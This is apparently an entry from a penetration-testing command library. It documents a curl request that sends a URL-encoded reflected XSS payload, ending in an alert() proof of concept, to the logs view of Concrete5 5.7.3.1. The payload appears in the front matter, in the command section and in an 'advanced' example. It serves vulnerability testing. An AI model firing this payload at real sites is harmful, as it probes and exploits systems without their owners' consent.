---
id: cmd-curl-xss-logs-001
data: >-
  curl
  'https://target.com/concrete5.7.3.1/index.php/dashboard/reports/logs/view?keywords=&level=&channel=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x0044C4)%3C/scRipt%3E&level[]=600'
tags:
  - xss
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.915Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss-logs

## Command

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/dashboard/reports/logs/view?keywords=&level=&channel=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x0044C4)%3C/scRipt%3E&level[]=600'
```

## Description

Performs a GET request to the Concrete5 logs view with an XSS payload URL-encoded in the channel parameter to check for reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL with query | Includes encoded payload in channel | Yes |

## Examples

### Basic Usage

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/dashboard/reports/logs/view?channel=test'
```

### Advanced Usage

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/dashboard/reports/logs/view?channel=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x0044C4)%3C/scRipt%3E' -v
```

## Expected Output

Response body shows reflected and unescaped payload, indicating XSS vulnerability.

## Related

- [[commands/curl-inject-xss-bannedwords]]
- [[procedures/Exploit-Reflected-XSS-in-Concrete5-Parameters]]
